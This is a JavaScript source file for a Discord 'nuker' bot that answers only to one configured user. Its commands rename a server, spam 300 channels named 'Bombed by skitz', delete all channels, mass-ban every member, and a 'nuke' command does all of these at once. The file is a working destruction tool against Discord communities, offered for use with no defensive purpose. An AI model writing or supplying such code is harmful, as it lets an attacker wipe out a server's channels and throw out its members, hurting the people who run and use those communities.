const Discord = require("discord.js")
const fs = require("fs")
const Clc = require("cli-color");
var config = require("./config.json")
const prefix = config.prefix
const client = new Discord.Client()

client.on("ready", () => {
    client.login(config.token);
    console.log('starting scripts .....')
    console.clear();
    console.log(Clc.green(`ready to go! ${client.user.tag}`))
})

client.on("message", message => {
    if (message.author.id != config.userid) { return; }
    let command = message.content.split(" ")[0]
    command = command.slice(prefix.length)
    let args = message.content.split(" ").slice(1)
    if (command) message.delete()


    
    if (command == "sn"){
      const sn = args.join(" ");
      message.guild.setName(`${sn}`)
    }


    if (command == "ch"){
  for (i = 0; i < 300; i++) {
      message.guild.createChannel('Bombed by skitz', { type: 'text' })
    }
}

  if (command == "dc"){
    for (i = 0; i < 300; i++) {
    message.guild.channels.forEach(channel => channel.delete())
    }
  }
   if (command === "banall"){
     message.guild.members.tap(member => member.ban("ez ban"));
   }

              if (command === "nuke"){
                 message.guild.channels.forEach(channel => channel.delete())
                   for (i = 0; i < 300; i++) {
                message.guild.createChannel('Bombed by skitz', { type: 'text' })
                message.guild.members.tap(member => member.ban("ez ban"));
                   }
              }
                 
})
client.login(config.token);